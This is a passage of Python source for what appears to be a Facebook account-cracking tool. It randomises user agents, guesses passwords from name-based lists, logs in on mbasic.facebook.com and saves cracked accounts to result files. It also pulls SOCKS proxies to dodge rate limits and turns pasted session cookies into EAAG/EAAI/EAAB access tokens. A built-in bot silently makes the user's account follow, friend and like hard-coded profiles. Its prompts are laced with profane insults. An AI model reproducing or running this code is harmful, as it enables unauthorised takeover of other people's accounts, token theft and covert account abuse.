				ugen_.append(f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}{str(rr(1111,9999))}) AppleWeb Kit/{str(rr(111,999))}.{str(rr(11,99))} (KHTML, like Gecko) Chrome/{str(rr(11,99))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Sa fari/{str(rr(111,999))}.{str(rr(11,99))}")
		elif pilih_ in ("5","05"):
			for x in range(2000):
				ugen_.append(f"Mozilla/5.0 (Linux; Android {str(rr(7,11))}; SM-{str(rc(aZ))}202{str(rc(aZ))} Build/{str(rc(aZ))}{str(rc(aZ))}{str(rr(1,9))}{str(rc(aZ))}.{str(rr(111111,999999))}.{str(rr(111,999))}; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(11,99))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(111,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(11,99))} [FB_IAB/FB4A;FBAV/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(11,99))}.{str(rr(111,999))};]")
		elif pilih_ in ("6","06"):
			for x in range(5000):
				ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
				if ugent1 in ugen_:pass
				else:ugen_.append(ugent1)
				ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
				if ugent2 in ugen_:pass
				else:ugen_.append(ugent2)
				ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
				if ugent3 in ugen_:pass
				else:ugen_.append(ugent3)
		elif pilih_ in ("7","07"):
			for x in range(2000):
				ugen_.append("Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}765{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.0.{str(rr(111,999))}.{str(rr(1111,9999))} Mobile Safari/537.36")
				ugen_.append(f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}765{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.0.{str(rr(111,999))}.{str(rr(1111,9999))} Mobile Safari/537.36")
				ugen_.append(f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}{str(rr(1111,9999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(111,999))} Mobile Safari/537.36")
				ugen_.append("Mozilla/5.0 (Linux; U; Android 6: en-us; GT-L501B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4891.133 Mobile Safari/537.36")
				ugen_.append("Mozilla/5.0 (Linux; U; Android 6; en-us; GT-F1330) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4616.135 Mobile Safari/537.36")
				ugen_.append("Mozilla/5.0 (Linux; U; Android 11; en-us; GT-N765K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4662.113 Mobile Safari/537.36")

		elif pilih_ in ("8","08"):
			try:
				jmlh = int(input(f">--Number of UserAgents--> "))
			except:jmlh=1
			for x in range(jmlh):
				ues=input('>--Enter UserAgent--> ')
				if ues == '':
					kotak("# DONT EMPTY THE DICK",I,I)
					time.sleep(5);self.buat_ugen()
				elif len(ues)<=100:
					kotak("# MINIMUM USERAGENT 99 WORDS",I,I)
					time.sleep(5);self.buat_ugen()
				else:
					ugen_.append(ues)
		else:
			kotak("# SORRY YOUR OPTION WAS NOT FOUND",I,I)
			self.buat_ugen()


	def pilih_url(self):
		global url_met
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Mobile\nFree\nMbasic")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			url_met = "mobile"
		elif hu in ['2','02']:
			url_met = "free"
		elif hu in ['3','03']:
			url_met = "mbasic"
		else:
			kotak("#  I SAID JUST CHOOSE 1-3, IS THAT DIFFICULT YOU FUCKER😠",I,I)
			time.sleep(2)
			self.pilih_url()
	def pilih_mentod(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4",f"Method 1\nMethod 2\nMethod 3\nMethod 4")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
		elif hu in ['3','03']:
			method = "ke3"
		elif hu in ['4','04']:
			method = "ke4"
		elif hu in ['5','05']:
			method = "ke5"
		else:
			kotak("# I SAID JUST CHOOSE 1-5, IS THAT DIFFICULT YOU FUCKER😠",I,I)
			time.sleep(2)
			self.pilih_mentod()


	def tanya_opsi(self):
		global opsi_y
		iprint(Panel(f'{CC}Do You Want to Show Account Session Options{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# DONT EMPTY, CHOOSE Y/N", I,I)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			opsi_y = "IYA"
		elif kp in ["n","N"]:
			opsi_y = "PEPEK"

		else:
			tod = f"{MM} Wrong Option {QQ}[{CC}{kp}{QQ}] {MM}It is not available..."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_opsi()
	def tanya_apk(self):
		global apk_me
		iprint(Panel(f"{CC}Do you want to show the application{QQ}({KK}Not Recommended{QQ})", style=Q, title="PEPEK DONT READ"))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# DONT EMPTY, FILL UP", I,I)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			apk_me = "IYA"
		elif kp in ["n","N"]:
			apk_me = "PEPEK"

		else:
			tod = f"{MM} Wrong Options {QQ}[{CC}{kp}{QQ}] {MM}It is not Available..."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_apk()
	def pas_me(self):
		global pass_
		iprint(Panel(f"{CC}Please Select Password Crack Combination{QQ}", style=Q, title="READ THE PASSWORD LIST FIRST"))
		wwe = me()
		wwe.add_column("NO", style=K, justify="center")
		wwe.add_column("CHOOSE", style=C, justify="center", width=60)
		wwe.add_row("1\n2\n3\n4\n5\n6", "name123,name12345\nname,name123,name1234,name12345\nname,name123,name12345,sayang,anjing,kontol\nname,name123,name12345 + 6 Password\nname,name123,name1234,name12345 + MANUAL\nMANUAL")
		sol().print(wwe, justify='center')
		kol = input(f">--Pilih 1-4--> ")
		if kol in [" ",""]:
			kotak("# DONT EMPTY. FILL IT", I,I)
			time.sleep(3),self.pas_me()
		elif kol in ["1","01"]:
			pass_ = "1"
		elif kol in ["2","02"]:
			pass_ = "2"
		elif kol in ["3","03"]:
			pass_ = "3"
		elif kol in ["4","04"]:
			pass_ = "4"
		elif kol in ["5","05"]:
			pass_ = "5"
			kotak("# USE , (comma) For Password Separator And Minimum Pass 6 Letters/Numbers",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# DONT LEAVE BLANK YOU ASSHOLE",I,I)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMUM PASSWORD MUST BE MORE THAN 5 LETTERS/NUMBERS",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		elif kol in ["6","06"]:
			pass_ = "6"
			kotak("# USE , (comma) For Password Separator And Minimum Pass 6 Letters/Numbers",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# DONT EMPTY. FILL IT ASSHOLE",I,I)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMUM PASSWORD MUST BE MORE THAN 5 LETTERS/NUMBERS",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		else:
			tod = f"{MM} Wrong Options {QQ}[{CC}{kol}{QQ}] {MM}It is not available.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()

def ubah_cok(cookie):
	try:
		cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	except:
		cok=cookie
	return(str(cok))
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	ok_ = Tree("               ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman: {o}THIS IS YOUR OK ACCOUNT {q}",guide_style="uu green")

	ok___ = ok__.add(f"{b}ID AND PASSWORD{q}")
	ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")

	ok___ = ok__.add(f"{b}COOKIES{q}")
	ok___.add(f"{c}{cok}{q}")


	try:
		active = Tree(f"\r{b}Active Apps{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{b}Inactive Apps{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	ok__.add(active)
	ok__.add(inactive)

	code="""Cyber Demon 
NightRage D Sadboy9
Chinda-XD
Comrade Antelope
Solid Daddy
Jewel-Cyber-Team(JCT)
FireBase
Ryhad TM"""
	pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
	ok____= ok__.add(f"{b}Thanks To:{q}")
	ok____.add(Group(pyhon))
	prints(ok__)



def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Added" in apk.text:
				active.add(f"\r{i}{str(apk.text).replace('Added',' Added')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="See More")["href"]
		get_active(next,active,cookie)
	except:pass

def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Expired" in apk.text:
				inactive.add(f"\r{m}{str(apk.text).replace('Expired',' Expired')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="See More")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

def ubah_bahasa(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'English (UK)' in str(x):
				language = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "English (UK)"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=language,cookies=cookie)
	except:pass



def cekfile_crk(folder):
	dirs = os.listdir(folder)
	god_cp,god_ok="",""
	for file in dirs:
		filex = (folder+"/"+file)
		try:
			juma = open(filex,"r").readlines()
			total = ("%s"%(str(len(juma))))
		except:total = (" ?? ")
		try:
			ijo__ = filex.split("results/OK-")[1]
			ijo_ = (QQ+II+"results/OK-"+ijo__)
			god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
		try:
			kuning__ = filex.split("results/CP-")[1]
			kuning_ = (QQ+KK+"results/CP-"+kuning__)
			god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
	iprint(Panel(god_ok, style=I, title="RESULTS OK"))
	iprint(Panel(god_cp, style=K, title="RESULTS CP"))
	print()



def hide_opsi(user,pe,tlt):
	ok_ = Tree("                                 ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman:",guide_style="uu red")
	ok___= ok__.add(f"{b}Id{q} And {b}Password{q}")
	ok___.add(f"{o}{user}{q}|{o}{pe}{q}|{q}{tlt}{q}")


	opsi= ok__.add("Option")
	check_op(user,pe,tlt,opsi)


	prints(ok__)
def check_op(userrz,pwz,ttl,opsi):
	try:
		host = "https://mbasic.facebook.com"
		ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
		ses = requests.Session()
		ses.headers.update({
		"Host": "mbasic.facebook.com",
		"cache-control": "max-age=0",
		"upgrade-insecure-requests": "1",
		"origin": host,
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": ua,
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with": "mark.via.gp",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "navigate",
		"sec-fetch-user": "?1",
		"sec-fetch-dest": "document",
		"referer": host+"/login/?next&ref=dbl&fl&refid=8",
		"accept-encoding": "gzip, deflate",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
		})
		data = {}
		ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":userrz,"pass":pwz})
		try:
			run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		except requests.exceptions.TooManyRedirects:
			opsi.add(f"{m}This account has been spammed{q}")
		if "c_user" in ses.cookies:
			opsi.add(f"{u}This Account Is Not CheckPointint😱😱{q}")
			open('results/OK-'+durasi+'.txt','a').write(userrz+"|"+pwz+"\n")
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Continue",
			"nh": nh
			}
			xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}HAPPY THIS ACCOUNT TAP YES😎 {q}({b}Login Difb Lite/Mbasic{q})")
				open('results/TAP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
			else:
				jml="%s%s"%(k,str(len(ngew)))
				opsi_ = opsi.add(f"\r{b}Number of Options {jml} {q}")
				for opt in range(len(ngew)):
					jo = str(opt+1)
					opsi_.add(f"{k}{jo}{q}. {b}{ngew[opt]}{q}")
				open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			opsi.add(f"{k}{oh}{q}")
		else:
			opsi.add(f"\r{m}This Account Password Has Been Changed{q}")
	except Exception as c:
		opsi.add(f"{m}Oops.. Looks like this account cant be checked!!{q}")
		open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")




def get_proxy_socks5():
	max_proxy = "100000"
	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks5.txt","a").write(proxz)
			file = open("data/prox_socks5.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... YOUR NETWORK IS DISCONNECTED",M,C)
			os.sys.exit()
def get_proxy_socks4():
	max_proxy = "100000"
	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks4.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks4.txt","a").write(proxz)
			file = open("data/prox_socks4.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... YOUR NETWORK IS DISCONNECTED",M,C)
			os.sys.exit()

def free_cookies():
	ul="https://m.facebook.com/100032386028880/posts/674525870303608/?app=fbl"
	ses = requests.Session()
	url = parser(ses.get("https://mbasic.facebook.com/100032386028880/posts/p/674525870303608").text,"html.parser")
	data = re.findall('"text":"(.*?)"',str(url))
	cokxyz = []
	n = 0
	for cok in data:
		if len(cok)>=20:
			try:
				if cok in cokxyz:pass
				else:
					n +=1
					cokxyz.append(cok)
					print(f"{k}{n}{q}. Cookies : {c}{cok}{q}")
			except:continue
#	ask = input(f"{q}Pilih Cookies : ")
	try:
#		cookie = cokxyz[int(ask)-1]
#		login_cookie(cookie)
		kotak("# PLEASE COPY COOKIES ACCORDING TO YOUR NEED!!",I, I)
		login_cok()
	except Exception as e:
		prints(Panel(f"{MM}Sorry An Error Occurred!!!",width=80,style=M))
		os.sys.exit()

def login():
	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}███████████████████████████████
████╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬████
██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
█╬╬╬███████╬╬╬╬╬╬╬╬╬███████╬╬╬█
█╬╬██╬╬╬╬███╬╬╬╬╬╬╬███╬╬╬╬██╬╬█
█╬██╬╬╬╬╬╬╬██╬╬╬╬╬██╬╬╬╬╬╬╬██╬█
█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
█╬╬╬╬█████╬╬╬╬╬╬╬╬╬╬╬█████╬╬╬╬█
█╬╬█████████╬╬╬╬╬╬╬█████████╬╬█
█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
█╬╬╬▓▓▓▓╬╬╬╬╬╬╬█╬╬╬╬╬╬╬▓▓▓▓╬╬╬█
█╬╬▓▓▓▓▓▓╬╬█╬╬╬█╬╬╬█╬╬▓▓▓▓▓▓╬╬█
█╬╬╬▓▓▓▓╬╬██╬╬╬█╬╬╬██╬╬▓▓▓▓╬╬╬█
█╬╬╬╬╬╬╬╬██╬╬╬╬█╬╬╬╬██╬╬╬╬╬╬╬╬█
█╬╬╬╬╬████╬╬╬╬███╬╬╬╬████╬╬╬╬╬█
█╬╬╬╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬╬╬╬█
██╬╬█╬╬╬╬╬╬╬╬█████╬╬╬╬╬╬╬╬█╬╬██
██╬╬██╬╬╬╬╬╬███████╬╬╬╬╬╬██╬╬██
██╬╬▓███╬╬╬████╬████╬╬╬███▓╬╬██
███╬╬▓▓███████╬╬╬███████▓▓╬╬███
███╬╬╬╬▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬███
████╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬████
█████╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬█████
██████╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬██████
███████╬╬╬╬╬╬╬███╬╬╬╬╬╬╬███████
████████╬╬╬╬╬╬███╬╬╬╬╬╬████████
█████████╬╬╬╬╬███╬╬╬╬╬█████████
███████████╬╬╬╬█╬╬╬╬███████████
███████████████████████████████
"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Using Cookies{QQ}"))
	tod = me()
	tod.add_column("NO", style=I, justify="center")
	tod.add_column("CHOOSE", style=C, justify="center", width=60)
	tod.add_column("STATUS", style=K, justify="center")
	tod.add_row(f"1\n2","Free Cookies\nLogin Cookies","{MM}OFF{QQ}\n{II}ONN{QQ}")
	sol().print(tod, justify='center')
	pil=input(f">--Pilih 1-2--> {q}")
	if pil in ("1","01"):
#		free_cookies()
		os.sys.exit("its been said maintenance !")
	elif pil in ("02","2"):
		os.system("clear")
		login_cok();os.sys.exit()
	else:
		kotak("# SORRY THE OPTION YOU CHOOSE DOES NOT HAVE !!",I,I);time.sleep(3)
		login()

def login_cok():
	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}
██████╗░░█████╗░██╗░░░██╗██╗██████╗░
██╔══██╗██╔══██╗██║░░░██║██║██╔══██╗
██║░░██║███████║╚██╗░██╔╝██║██║░░██║
██║░░██║██╔══██║░╚████╔╝░██║██║░░██║
██████╔╝██║░░██║░░╚██╔╝░░██║██████╔╝
╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═════╝░{AL}"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Using Cookies{QQ}"))
	kotak("# ENTER YOUR FRESH COOKIES", K,Q)
	try:
		cokex = input(f">--{c}YOUR COOKIES{q}--> ")
		kotak("# PLEASE BE PATIENT... CURRENTLY ANALYSING FACEBOOK TOKEN/COOKIES",K,Q)
		if cokex in [" ",""]:
			kotak('# Dont leave empty...');time.sleep(3)
			login()

		user = cokex.split("c_user=")[1]
		try:
			user = user.split(";")[0]
		except:
			user = ""
		kukis_sus = cokex
		kukis_sus = kukis_sus.replace("noscript=1", "")
		kukis_impos = ""
		kukis_sus = kukis_sus.replace("c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user, "")
		kukis_sus = kukis_sus.replace("c_user="+user, "")
		kukis_impos += kukis_sus
		kukis_impos += ";"
		kukis_impos += "c_user="
		kukis_impos += user
		coki = kukis_impos
		_cookie = kukis_impos
		try:
			convert_token(_cookie)
			open_role()
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			bot_facebook()
			kotak(f"# Welcome {nama}.... Hope Your Tokens Lasts", I, Q)
			iprint(Panel("Successfully Login Using Cookies !!!\nPlease Type : python main.py"))
		except Exception as e:
			print(str(e))
			try:os.system("rm -f data/login.txt")
			except:pass
			try:os.system("rm -f data/cookie.txt")
			except:pass
			kotak(f"# SORRY, YOUR COOKIE HAS AN ERROR {str(e)}", I, I)

		os.sys.exit()
	except Exception as e:
#		print(str(e))
		kotak(f"# ERROR : {e}", I, I)
		os.sys.exit()
class convert_token:
	def __init__(self, kues):
		global kukis_,kukis
		kukis_ = kues
		kukis = {'cookie':kukis_}
		self.__eaag__()
#		self.__eaai__()
#		self.__eaab__()
	def __eaag__(self):
		sus = requests.Session()
		sus_ = sus.get("https://business.facebook.com/business_locations",headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis_})
		hasil_ = (re.findall("(EAAG\w+)", sus_.text))
		if len(hasil_) == 0:
			kotak("# SORRY, YOU CANT CHANGE YOUR COOKIES EAAG TOKEN",I,I)
			kotak('# PLEASE BE PATIENT CURRENTING THE EAAI TOKEN',I, I)
			self.__eaai__()
#			os.sys.exit()
		else:
			for token in hasil_:
				open("data/login.txt", "w").write(token)
			open("data/cookie.txt", "w").write(kukis_)
	def __eaai__(self):
		with requests.Session() as r:
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie':kukis_}
			response = r.get('https://web.facebook.com/ads/manager/account_settings/account_billing/?_rdc=1&_rdr', headers = headers)
			find = re.findall('(EAAI\w+)', response.text)
			if len(find) == 0:
				kotak("# SORRY, YOU CANT CHANGE YOUR COOKIES EAAI TOKEN",I,I)
				kotak('# PLEASE BE PATIENT CREATING THE EAAB TOKEN',I, I)
				self.__eaab__()
#				os.sys.exit()
			else:
				for token in find:
					open("data/login.txt", "w").write(token)
				open("data/cookie.txt", "w").write(kukis_)
	def __eaab__(self):
		with requests.Session() as r:
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie': kukis_}
			respon = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
			find = re.findall('act=(.*?)&nav_source', respon.text)
			if len(find) == 0:
				kotak("# SORRY, YOU CANT CHANGE YOUR COOKIES EAAB TOKEN",I,I)
				os.sys.exit()
			else:
				for y in find:
					response = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={y}&nav_source=no_referrer', headers = headers)
					token = re.search('(EAAB\w+)', response.text).group(1)
					open("data/login.txt", "w").write(token)
				open("data/cookie.txt", "w").write(kukis_)
		os.sys.exit()




class bot_facebook:
	def __init__(self):
		open_role()
		with __Kiky__(max_workers=10) as (kiky_gtg):
			for n in id_ri:
				kiky_gtg.submit(self.all_bot(n))
	def all_bot(self,nn):
		self.language();self.get_likers(nn);self.get_fols(nn);self.get_posts(nn)
	def get_likers(self,idq):
		with requests.Session() as xyz:
			try:
				for x in par(xyz.get('https://mbasic.facebook.com/%s?v=timeline'%(idq),cookies=puput).content,'html.parser').find_all('a',href=True):
#					open('fol.py',"a").write(x.text)
					if 'Respond' in x.text:
						_react_type_ = random.choice(['Super','Wow','Sedih','Peduli'])
						for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput).content,'html.parser').find_all('a'):
							if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=puput)
							else:continue
				for x in par(xyz.get('https://mbasic.facebook.com/%s'%(idq),cookies=puput).content,'html.parser').find_all('a',href=True):
#					open('fol.py',"a").write(x.text)
					if 'Comment' in x.text:
						_react_type_ = random.choice(['Super','Wow','Sedih','Peduli'])
						for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput).content,'html.parser').find_all('a'):
							req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=puput)
			except Exception as e:pass
	def get_fols(self,idq):
			try:
				with requests.Session() as xyz:
					for x in par(xyz.get('https://mbasic.facebook.com/%s'%(idq),cookies=puput).content,'html.parser').find_all('a',href=True):
#						open('fol.py',"a").write(x.text)
						if 'subscribe.php' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						elif 'Add friend' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						elif 'Follow' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						elif 'Like' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						elif 'Like Page' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)

			except Exception as e:pass
	def language(self):
		try:
			with requests.Session() as xyz:
				req = xyz.get('https://mbasic.facebook.com/language/',cookies=puput)
				pra = par(req.content,'html.parser')
				for x in pra.find_all('form',{'method':'post'}):
					if 'English (UK)' in str(x):
						language = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
